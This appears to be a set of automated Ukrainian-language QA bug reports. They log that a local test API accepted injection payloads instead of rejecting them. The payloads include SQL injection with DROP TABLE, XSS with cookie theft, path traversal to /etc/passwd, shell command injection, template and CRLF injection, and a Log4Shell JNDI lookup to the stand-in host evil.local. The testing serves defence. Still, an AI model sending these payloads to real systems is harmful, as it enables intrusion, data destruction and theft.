## BR-116: Team → SQL_XSS Create team, ітерація 33: [Length] payload не відхилено

**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 33 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(123 символів)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-117: Team → SQL_XSS Create team, ітерація 34: [Length] payload не відхилено

**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 34 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb...(283 символів)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-118: Unit → SQL_XSS Create unit, ітерація 1: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 1 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = ' OR '1'='1`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-119: Unit → SQL_XSS Create unit, ітерація 2: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 2 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = admin'--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-120: Unit → SQL_XSS Create unit, ітерація 3: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 3 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = '; DROP TABLE Unit;--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-121: Unit → SQL_XSS Create unit, ітерація 4: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 4 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = ' OR SLEEP(5)--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-122: Unit → SQL_XSS Create unit, ітерація 5: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 5 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = ' UNION SELECT NULL--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-123: Unit → SQL_XSS Create unit, ітерація 6: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 6 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = ' OR '1'='1`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-124: Unit → SQL_XSS Create unit, ітерація 7: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 7 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = '; DROP TABLE Unit;--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-125: Unit → SQL_XSS Create unit, ітерація 8: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 8 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = ' OR SLEEP(5)--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-126: Unit → SQL_XSS Create unit, ітерація 9: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 9 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = <script>alert(1)</script>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-127: Unit → SQL_XSS Create unit, ітерація 10: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 10 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = <img src=x onerror=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-128: Unit → SQL_XSS Create unit, ітерація 11: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 11 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = <svg onload=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-129: Unit → SQL_XSS Create unit, ітерація 12: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 12 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = <body onload=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-130: Unit → SQL_XSS Create unit, ітерація 13: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 13 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = <iframe src=javascript:alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-131: Unit → SQL_XSS Create unit, ітерація 14: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 14 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = javascript:alert(1)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-132: Unit → SQL_XSS Create unit, ітерація 15: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 15 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = <script>alert(document.cookie)</script>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-133: Unit → SQL_XSS Create unit, ітерація 16: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 16 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = <img src=x onerror=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-134: Unit → SQL_XSS Create unit, ітерація 17: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 17 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = <svg/onload=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-135: Unit → SQL_XSS Create unit, ітерація 18: [NoSQL Injection] payload не відхилено

**Опис:** Payload категорії «NoSQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 18 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = {$ne: null}`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-136: Unit → SQL_XSS Create unit, ітерація 19: [NoSQL Injection] payload не відхилено

**Опис:** Payload категорії «NoSQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 19 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = [$gt]=`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-137: Unit → SQL_XSS Create unit, ітерація 20: [LDAP Injection] payload не відхилено

**Опис:** Payload категорії «LDAP Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 20 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = *)(uid=*`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-138: Unit → SQL_XSS Create unit, ітерація 21: [Path Traversal] payload не відхилено

**Опис:** Payload категорії «Path Traversal» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 21 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = ../../../../etc/passwd`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-139: Unit → SQL_XSS Create unit, ітерація 22: [Path Traversal] payload не відхилено

**Опис:** Payload категорії «Path Traversal» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 22 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = ....//....//etc/passwd`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-140: Unit → SQL_XSS Create unit, ітерація 23: [Command Injection] payload не відхилено

**Опис:** Payload категорії «Command Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 23 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = ; ls -la`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-141: Unit → SQL_XSS Create unit, ітерація 24: [Command Injection] payload не відхилено

**Опис:** Payload категорії «Command Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 24 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = | whoami`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-142: Unit → SQL_XSS Create unit, ітерація 25: [Template Injection] payload не відхилено

**Опис:** Payload категорії «Template Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 25 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = ${7*7}`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-143: Unit → SQL_XSS Create unit, ітерація 26: [Template Injection] payload не відхилено

**Опис:** Payload категорії «Template Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 26 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = <%= 7*7 %>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-144: Unit → SQL_XSS Create unit, ітерація 27: [Log4Shell] payload не відхилено

**Опис:** Payload категорії «Log4Shell» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 27 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = ${jndi:ldap://evil.local/a}`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-145: Unit → SQL_XSS Create unit, ітерація 28: [Log4Shell] payload не відхилено

**Опис:** Payload категорії «Log4Shell» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 28 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = ${jndi:ldap://evil.local/a}`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-146: Unit → SQL_XSS Create unit, ітерація 29: [CRLF Injection] payload не відхилено

**Опис:** Payload категорії «CRLF Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 29 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = admin%0d%0aSet-Cookie: x=1`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-147: Unit → SQL_XSS Create unit, ітерація 30: [CRLF Injection] payload не відхилено

**Опис:** Payload категорії «CRLF Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 30 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = test%0d%0aX-Injected: true`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-148: Unit → SQL_XSS Create unit, ітерація 31: [Null Byte] payload не відхилено

**Опис:** Payload категорії «Null Byte» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 31 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = unit%00`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-149: Unit → SQL_XSS Create unit, ітерація 32: [Homoglyph] payload не відхилено

**Опис:** Payload категорії «Homoglyph» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 32 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = Unіt with Cyrillic look-alikes`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-150: Unit → SQL_XSS Create unit, ітерація 33: [Length] payload не відхилено

**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 33 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(123 символів)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-151: Unit → SQL_XSS Create unit, ітерація 34: [Length] payload не відхилено

**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 34 (Unit → SQL_XSS Create unit)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `payload = bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb...(283 символів)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-152: Department → SQL_XSS Create department, ітерація 1: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 1 (Department → SQL_XSS Create department)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/departments`
- Request body: `payload = ' OR '1'='1`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-153: Department → SQL_XSS Create department, ітерація 2: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 2 (Department → SQL_XSS Create department)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/departments`
- Request body: `payload = admin'--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-154: Department → SQL_XSS Create department, ітерація 3: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 3 (Department → SQL_XSS Create department)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/departments`
- Request body: `payload = '; DROP TABLE Departments;--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-155: Department → SQL_XSS Create department, ітерація 4: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 4 (Department → SQL_XSS Create department)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/departments`
- Request body: `payload = ' OR '1'='1`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-156: Department → SQL_XSS Create department, ітерація 5: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 5 (Department → SQL_XSS Create department)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/departments`
- Request body: `payload = <script>alert(1)</script>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-157: Department → SQL_XSS Create department, ітерація 6: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 6 (Department → SQL_XSS Create department)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/departments`
- Request body: `payload = <img src=x onerror=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-158: Department → SQL_XSS Create department, ітерація 7: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 7 (Department → SQL_XSS Create department)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/departments`
- Request body: `payload = <svg onload=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-159: Department → SQL_XSS Create department, ітерація 9: [Length] payload не відхилено

**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 9 (Department → SQL_XSS Create department)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/departments`
- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(123 символів)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-160: Department → SQL_XSS Create department, ітерація 10: [Length] payload не відхилено

**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 10 (Department → SQL_XSS Create department)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/departments`
- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(134 символів)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-161: Department → SQL_XSS Create department, ітерація 11: [Length] payload не відхилено

**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 11 (Department → SQL_XSS Create department)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/departments`
- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(134 символів)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-162: Department → SQL_XSS Edit department, ітерація 1: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 1 (Department → SQL_XSS Edit department)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/departments/11`
- Request body: `payload = ' OR '1'='1`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`

---

## BR-163: Department → SQL_XSS Edit department, ітерація 2: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 2 (Department → SQL_XSS Edit department)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/departments/11`
- Request body: `payload = admin'--`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`

---

## BR-164: Department → SQL_XSS Edit department, ітерація 3: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 3 (Department → SQL_XSS Edit department)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/departments/11`
- Request body: `payload = '; DROP TABLE Departments;--`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`

---

## BR-165: Department → SQL_XSS Edit department, ітерація 4: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 4 (Department → SQL_XSS Edit department)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/departments/11`
- Request body: `payload = ' OR '1'='1`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`

---

## BR-166: Department → SQL_XSS Edit department, ітерація 5: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 5 (Department → SQL_XSS Edit department)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/departments/11`
- Request body: `payload = <script>alert(1)</script>`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`

---

## BR-167: Department → SQL_XSS Edit department, ітерація 6: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 6 (Department → SQL_XSS Edit department)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/departments/11`
- Request body: `payload = <img src=x onerror=alert(1)>`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`

---

## BR-168: Department → SQL_XSS Edit department, ітерація 7: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 7 (Department → SQL_XSS Edit department)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/departments/11`
- Request body: `payload = <svg onload=alert(1)>`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`

---

## BR-169: Department → SQL_XSS Edit department, ітерація 9: [Length] payload не відхилено

**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 9 (Department → SQL_XSS Edit department)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/departments/11`
- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(123 символів)`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`

---

## BR-170: Department → SQL_XSS Edit department, ітерація 10: [Length] payload не відхилено

**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 10 (Department → SQL_XSS Edit department)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/departments/11`
- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(134 символів)`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`

---

## BR-171: Department → SQL_XSS Edit department, ітерація 11: [Length] payload не відхилено

**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 11 (Department → SQL_XSS Edit department)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/departments/11`
- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(134 символів)`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `204`

---
